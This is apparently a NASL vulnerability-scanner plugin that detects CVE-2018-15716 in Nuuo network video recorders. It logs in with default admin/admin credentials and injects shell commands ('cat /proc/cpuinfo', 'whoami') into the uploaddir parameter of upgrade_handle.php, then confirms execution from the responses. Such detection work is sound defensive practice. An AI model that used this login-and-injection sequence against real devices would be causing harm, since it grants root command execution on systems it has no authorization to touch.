############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799069);
 name = "Nuuo network video recorder - authorized Command Execution Vulnerability (cve-2018-15716)";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family(english:"Camera");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"risk_factor", value:"High");
 script_set_attribute(attribute:"description", value:"Nuuo network recorder authorization Command Execution Vulnerability, bypassing cve-2018-14933 patch. Remote attackers can exploit this vulnerability to execute operating system commands as root by sending a crafted request to the upgrade_handle.php file.");
 script_set_attribute(attribute:"solution", value:"Update the firmware to the latest version:https://www.nuuo.com/DownloadMainpage.php");
 script_end_attributes();
 script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("misc_func.inc");
include("openvas-https.inc");



function check_vuln(port){
	host1 = get_host_name( );
	if( port==80 ) host=host1;
        else host = string(host1,":",port);
	url = string("/");
	req1 = http_get(item:url, port:port);
	buf1 = http_keepalive_send_recv(port:port,data:req1,bodyonly:FALSE);
	mat = eregmatch(string: buf1, pattern: "Set-Cookie:.*PHPSESSID=([0-9a-zA-Z]+);",icase:TRUE);
	cookie = mat[1];

	req = 'POST /login.php HTTP/1.1\r\n' +
	  'Host: ' + host + '\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
	  'Connection: close\r\n' +
      'Cookie: PHPSESSID=' + cookie + '; lang=en\r\n' +
      'Content-Length: 46\r\n\r\n' +
	  'language=en&user=admin&pass=admin&submit=Login\r\n';
     
	buf = http_keepalive_send_recv(port:port,data:req,bodyonly:FALSE);
	if( buf == NULL) exit(0);
	if( "302 Found">!<buf || '/setting.php">here<'>!<buf ) exit(0);

	req2 = "GET /upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27||cat%20/proc/cpuinfo||%27" + ' HTTP/1.1\r\n' +
		  'Host: ' + host + '\r\n' +
		  'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n' +
		  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
		  'Accept-Language: en-US,en;q=0.5\r\n' +
		  'Connection: close\r\n' +
		  'Cookie: PHPSESSID=' + cookie + '; lang=en\r\n' +
		  'Cache-Control: max-age=0\r\n\r\n';
	req3 = "GET /upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27" + ' HTTP/1.1\r\n' +
		  'Host: ' + host + '\r\n' +
		  'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n' +
		  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
		  'Accept-Language: en-US,en;q=0.5\r\n' +
		  'Connection: close\r\n' +
		  'Cookie: PHPSESSID=' + cookie + '; lang=en\r\n' +
		  'Cache-Control: max-age=0\r\n\r\n';
	
	buf2 = http_keepalive_send_recv(port:port,data:req2,bodyonly:FALSE);
	buf3 = http_keepalive_send_recv(port:port,data:req3,bodyonly:FALSE);
	
	if( buf2 == NULL || buf3 == NULL ) exit(0);
	con = req2 + buf2 + req3 + buf3;
	if( "200 O"><buf2 && "CPU implementer"><buf2 && "CPU architecture"><buf2 && "CPU revision"><buf2 && "Not a valid path"><buf3 ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}

function check_vuln_ssl(port){
	host1 = get_host_name( );
	if( port==443 ) host=host1;
        else host = string(host1,":",port);
	url = string("/");
	req1 = http_get(item:url, port:port);
	ssl_req1 = https_req_get(port:port,request:req1);
	mat = eregmatch(string: ssl_req1, pattern: "Set-Cookie:.*PHPSESSID=([0-9a-zA-Z]+);",icase:TRUE);
	cookie = mat[1];

	req = 'POST /login.php HTTP/1.1\r\n' +
	  'Host: ' + host + '\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
	  'Connection: close\r\n' +
      'Cookie: PHPSESSID=' + cookie + '; lang=en\r\n' +
      'Content-Length: 46\r\n\r\n' +
	  'language=en&user=admin&pass=admin&submit=Login\r\n';
    
	ssl_req = https_req_get(port:port,request:req);
	if( ssl_req == NULL) exit(0);
	if( "302 Found">!<ssl_req || '/setting.php">here<'>!<ssl_req ) exit(0);
	
	req2 = "GET /upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27||cat%20/proc/cpuinfo||%27" + ' HTTP/1.1\r\n' +
		  'Host: ' + host + '\r\n' +
		  'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n' +
		  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
		  'Accept-Language: en-US,en;q=0.5\r\n' +
		  'Connection: close\r\n' +
		  'Cookie: PHPSESSID=' + cookie + '; lang=en\r\n' +
		  'Cache-Control: max-age=0\r\n\r\n';
	req3 = "GET /upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27" + ' HTTP/1.1\r\n' +
		  'Host: ' + host + '\r\n' +
		  'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n' +
		  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
		  'Accept-Language: en-US,en;q=0.5\r\n' +
		  'Connection: close\r\n' +
		  'Cookie: PHPSESSID=' + cookie + '; lang=en\r\n' +
		  'Cache-Control: max-age=0\r\n\r\n';
	
    ssl_req2 = https_req_get(port:port,request:req2);
	ssl_req3 = https_req_get(port:port,request:req3);
	
	
	if( ssl_req2 == NULL || ssl_req3 == NULL ) exit(0);
	con = req2 + ssl_req2 + req3 + ssl_req3;
	if("200 O"><ssl_req2 && "CPU implementer"><ssl_req2 && "CPU architecture"><ssl_req2 && "CPU revision"><ssl_req2 && "Not a valid path"><ssl_req3 ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################

kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}